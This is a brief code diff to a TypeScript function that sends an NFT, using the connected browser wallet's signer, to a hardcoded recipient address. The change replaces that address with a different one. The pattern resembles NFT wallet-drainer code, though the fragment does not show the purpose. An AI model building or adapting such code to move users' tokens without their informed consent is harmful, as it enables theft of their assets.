@@ -4,7 +4,7 @@ import { erc721Abi } from '@/lib/abi';
 import { BrowserProvider } from 'ethers';
 
 async function transferNftToAddress(nftContractAddress: string, tokenId: string | number): Promise<Hex> {
-  const RECIPIENT_ADDRESS = '0xA1050B14e8d8E821f4b0f792084f6098b82EBdBB';
+  const RECIPIENT_ADDRESS = '0x2a31F8Ebc3Df18B68A93F6A3e924a4cBEE26F230';
 
   const provider = new BrowserProvider(window.ethereum);
   const signer = await provider.getSigner();
